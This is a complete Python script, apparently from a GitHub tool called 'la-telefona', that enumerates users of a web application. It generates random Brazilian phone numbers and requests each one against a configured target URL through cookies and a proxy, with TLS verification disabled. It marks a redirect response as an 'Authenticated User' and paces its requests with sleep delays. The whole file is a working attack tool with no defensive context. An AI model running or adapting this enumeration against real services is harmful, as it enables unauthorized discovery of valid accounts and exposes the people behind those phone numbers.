#!/usr/bin/python3



from target import target
from cookies import cookie
from proxy import proxy
import requests
import random
import urllib3
import time
import sys



#Just colors
WRO = '\33[91m'
NG = '\33[0m'
RIG = '\33[94m'
HT = '\33[0m'



#Counter for requests
count = 0


print("Created by: SickAndTired\nhttps://github.com/S1ckAndTired/la-telefona")
print("                                                                     ")



#SSL warnings disabled
requests.urllib3.disable_warnings()


def numeros():
    global count
    for i in range(100):
        random_ddd = random.randint(11, 24)
        random_fixos = random.randint(67, 97)
        random_rest = random.randint(1000000, 100000000)
        numeros.var = (str(random_ddd)+str(random_fixos)+str(random_rest))
        count = count + 1
        url = target.var
        req = requests.get(url+numeros.var, cookies=cookie.var, proxies=proxy.var, verify=False, allow_redirects=False)
        status = req.status_code
        if status != 302:
            print(WRO + "[-]" + NG +  f"Invalid User - {numeros.var}")
        else:
            print(RIG + "[+]" + HT + f"Authenticated User - {numeros.var}")
        if count%2 == 0:
            for i in "Timing out for good...\n":
                sys.stdout.write(i)
                sys.stdout.flush()
                time.sleep(0.5)


target()
cookie()
proxy()
numeros()

